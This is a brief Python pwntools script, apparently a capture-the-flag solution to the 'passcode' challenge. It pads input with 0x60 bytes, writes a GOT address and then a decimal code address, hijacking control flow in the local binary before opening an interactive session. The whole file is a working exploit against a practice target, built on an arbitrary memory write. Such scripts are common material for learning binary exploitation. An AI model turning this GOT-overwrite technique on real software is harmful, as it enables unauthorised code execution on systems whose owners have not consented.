#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *


io = process('./passcode')

payload = 'a'*0x60
payload += p32(0x0804A000) + '\n'
#0x80485E3 = 134514147
payload += '134514147\n'

io.sendline(payload)
io.interactive()
